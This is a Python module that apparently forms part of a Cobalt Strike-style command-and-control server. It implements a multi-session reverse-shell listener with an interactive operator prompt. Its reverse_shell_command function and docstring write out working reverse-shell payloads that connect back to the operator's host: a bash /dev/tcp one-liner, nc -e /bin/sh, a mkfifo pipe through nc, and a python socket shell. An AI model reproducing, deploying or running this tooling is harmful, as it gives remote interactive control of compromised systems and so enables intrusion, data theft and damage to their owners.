"""Raw reverse-shell listener (Cobalt Strike-style raw TCP interactive shell).

Receives a classic bash reverse connection:

    nc -e /bin/sh HOST PORT           # netcat variant
    bash -i >& /dev/tcp/HOST/PORT 0>&1 # pure bash (no nc) -- most portable
    /bin/sh -i <&3 >&3 2>&3 3<&3    # with a pre-established fd

For each inbound connection the team server keeps an interactive shell: it can
send one command at a time and streams the target's stdout/stderr back. Multiple
concurrent reverse shells are supported (one thread each).

This is a separate transport from the HTTP/HTTPS beacon. It is a *control*
session (raw shell), not an HTTP tasking channel.
"""
import socket
import textwrap
import threading


def reverse_shell_command(host, port, variant="bash"):
    """Return a one-liner the target runs to call back to this listener."""
    if variant == "bash":
        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
    if variant == "nc":
        return f"nc {host} {port} -e /bin/sh"
    if variant == "nc-e":
        return f"nc -e /bin/sh {host} {port}"
    if variant == "mkfifo":
        # classic bash fifo-based fully interactive
        return (f"rm -f /tmp/.f; mkfifo /tmp/.f; cat /tmp/.f | /bin/sh -i 2>&1 "
                f"| nc {host} {port} > /tmp/.f")
    if variant == "python":
        return (f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{host}\",{port}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
    raise ValueError(f"unknown variant: {variant}")


VARIANTS = ["bash", "nc", "nc-e", "mkfifo", "python"]


class ReverseShellSession:
    """One live interactive reverse shell attached to a target socket."""

    def __init__(self, session_id, conn, addr, listener_name):
        self.id = session_id
        self.conn = conn
        self.addr = addr
        self.listener = listener_name
        self.open = True
        self.lock = threading.Lock()
        self._buf = bytearray()
        self._pos = 0
        self._reader = threading.Thread(target=self._read_loop, daemon=True)
        self._reader.start()

    def _read_loop(self):
        try:
            while True:
                try:
                    data = self.conn.recv(65536)
                except socket.timeout:
                    continue            # idle is fine; keep monitoring
                except OSError:
                    break               # connection closed / reset
                if not data:
                    break
                with self.lock:
                    self._buf.extend(data)
        except Exception:
            pass
        finally:
            self.open = False

    def buffer_more(self, timeout=0.5):
        """Attempt to read whatever is ready and return any new output bytes."""
        with self.lock:
            avail = self._buf[self._pos:]
            self._pos = len(self._buf)
            return bytes(avail)

    def read_available(self):
        with self.lock:
            b = bytes(self._buf[self._pos:])
            self._pos = len(self._buf)
            return b

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        with self.lock:
            self.conn.sendall(data)
        return True

    def send_line(self, cmd):
        return self.send(cmd + "\n")

    def close(self):
        try:
            self.conn.close()
        except Exception:
            pass
        self.open = False

    def __repr__(self):
        return (f"<ReverseShell {self.id} {self.addr[0]}:{self.addr[1]} " +
                f"(listener {self.listener}) open={self.open}>")


class ReverseShellListener:
    """Raw TCP listener accepting bash reverse shells."""

    def __init__(self, name, host, port, on_session=None):
        self.name = name
        self.host = host
        self.port = port
        self.on_session = on_session
        self.sock = None
        self.thread = None
        self.running = False
        self.sessions = {}   # session_id -> ReverseShellSession
        self._seq = 0
        self.lock = threading.Lock()

    @property
    def url(self):
        return f"reverse-shell://{self.host}:{self.port}"

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(64)
        self.sock.settimeout(1.0)  # allow clean shutdown
        self.running = True
        self.thread = threading.Thread(target=self._accept_loop, daemon=True)
        self.thread.start()
        return self

    def stop(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        sessions = list(self.sessions.values())
        if sessions:
            for s in sessions:
                s.close()
            self.sessions.clear()

    def _accept_loop(self):
        while self.running:
            try:
                conn, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            # give the shell time to start outputting its banner
            conn.settimeout(1.0)
            with self.lock:
                self._seq += 1
                sid = f"rsh-{self._seq}"
            sess = ReverseShellSession(sid, conn, addr, self.name)
            with self.lock:
                self.sessions[sid] = sess
            if self.on_session:
                try:
                    self.on_session(sess)
                except Exception:
                    pass

    def get(self, sid):
        with self.lock:
            return self.sessions.get(sid)

    def list_sessions(self):
        with self.lock:
            return list(self.sessions.values())

    def close_session(self, sid):
        with self.lock:
            s = self.sessions.pop(sid, None)
        if s:
            s.close()
        return s


def interactive_loop(listener, sess):
    """Operate an interactive reverse shell directly on this terminal/stdin.
    Reads a command line, sends it, prints available output, repeats."""
    import select as _sel
    while sess.open:
        try:
            cmd = input(f'rsh[{sess.id}]> ')
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if cmd.strip() in ("exit", "quit", "q"):
            break
        if not cmd.strip():
            continue
        sess.send_line(cmd.strip())
        import time as _t
        _t.sleep(0.3)
        out = sess.read_available()
        if out:
            src = out.decode(errors="replace")
            sys_write(src if src.endswith("\n") else src + "\n")
        else:
            print("(no output)")
    sess.close()
    return 0


def sys_write(s):
    import sys as _sys
    _sys.stdout.write(s)
